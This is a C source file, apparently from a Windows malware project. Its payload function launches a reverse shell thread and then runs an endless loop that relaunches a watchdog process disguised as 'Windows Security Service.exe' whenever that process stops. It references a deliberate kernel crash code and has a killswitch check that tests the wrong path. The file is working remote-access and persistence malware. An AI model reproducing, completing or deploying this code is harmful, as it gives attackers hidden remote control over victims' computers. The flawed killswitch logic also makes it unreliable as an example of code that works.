#include <Windows.h>
#include <io.h>

#include "utils.h"
#include "reverse_shell/reverse_shell.h"

extern char serviceName[64];

// Execute the payload
void payload(){
    // Create a thread for the reverse shell
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)reverse_shell, NULL, 0, NULL);

    // Check if the watchdog is running
    while(1){
        if(!findFirstProc("Windows Security Service.exe")){
            char destination[MAX_PATH];
            GetDestination(destination);

            char killswitchDestination[MAX_PATH];
            strcpy(killswitchDestination, destination);
            strcat(killswitchDestination, serviceName);
            strcat(killswitchDestination, "\\");
            strcat(killswitchDestination, "carbyte_killswitch");

            // Return if the killswitch is present
            if(_access(destination, 0)) return;

            // KERNEL_SECURITY_CHECK_FAILURE (0x139)
            char watchdogDestination[MAX_PATH];
            strcpy(watchdogDestination, destination);
            strcat(watchdogDestination, "AMS\\Windows Security Service.exe");
            StartProgram(watchdogDestination, watchdogDestination, "-watchdog");
        }
        Sleep(100);
    }
}